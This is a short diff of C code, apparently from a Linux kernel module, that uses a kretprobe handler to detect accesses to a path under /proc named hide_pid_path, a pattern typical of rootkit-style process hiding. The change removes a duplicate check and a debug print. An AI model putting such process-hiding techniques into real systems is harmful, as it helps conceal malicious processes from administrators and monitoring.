@@ -80,8 +80,6 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 
     struct super_block* sb= file->f_path.mnt->mnt_sb;
 
-    if(strcmp(path, hide_pid_path) == 0){
-        pr_info("found usage in path=%s\n", path);
     // checking if the vfs is proc
     if(strcmp(sb->s_id, "proc") == 0){
         if(strcmp(path, hide_pid_path) == 0){
